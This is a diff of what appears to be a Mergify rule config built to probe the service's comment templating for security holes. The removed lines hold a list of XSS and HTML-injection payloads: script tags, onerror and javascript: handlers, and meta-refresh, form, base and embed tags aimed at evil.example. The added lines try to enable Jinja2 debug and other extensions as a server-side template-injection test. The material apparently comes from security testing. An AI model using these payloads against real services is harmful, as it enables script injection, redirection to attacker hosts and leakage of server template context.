@@ -1,32 +1,13 @@
+_extensions:
+  - jinja2.ext.debug
+  - jinja2.ext.do
+  - jinja2.ext.i18n
 pull_request_rules:
-  - name: xss-probes-4021
+  - name: ext-test-14445
     conditions: []
     actions:
       comment:
         message: |
-          === G4o7T v21 XSS / RAW HTML PROBES ===
-
-          {% autoescape false %}
-          [X1-script]: <script>alert('G4o7T-1')</script>
-          [X2-img]: <img src=x onerror="alert('G4o7T-2')">
-          [X3-svg]: <svg onload="alert('G4o7T-3')">
-          [X4-iframe]: <iframe srcdoc="<script>alert('G4o7T-4')</script>"></iframe>
-          [X5-a-js]: <a href="javascript:alert('G4o7T-5')">click</a>
-          [X6-details]: <details open><summary>click</summary>secret</details>
-          [X7-style]: <style>body{background:red}</style>
-          [X8-meta]: <meta http-equiv=refresh content=0;url=//evil.example>
-          [X9-form]: <form action=//evil.example/x>
-          [X10-link]: <link rel=stylesheet href=//evil.example/x.css>
-          [X11-data-uri-img]: <img src="data:text/html,<script>alert(1)</script>">
-          [X12-onclick]: <a onclick=alert(1) href="#">click</a>
-          [X13-base]: <base href=//evil.example/>
-          [X14-object]: <object data=//evil.example/x.swf></object>
-          [X15-embed]: <embed src=//evil.example/x.swf>
-          [X16-svg-href]: <svg><a href="javascript:alert(1)"><text>click</text></a></svg>
-          [X17-html-injection]: </details><script>alert(1)</script>
-          [X18-markdown-trick]: [link](javascript:alert(1))
-          {% endautoescape %}
-
-          === ALSO test get_section behavior ===
-          [S1] body section default: '{{ body | get_section('# Anything', 'NOT_FOUND') }}'
-          [S2] section with payload as name: '{{ body | get_section(author | replace('mergify-account-B', '# fake'), 'def') }}'
+          === G4o7T v22 EXTENSION ENABLE TEST ===
+          [E1] try debug: {% debug %}
+          [E2] try gettext: {{ _('marker_test') }}
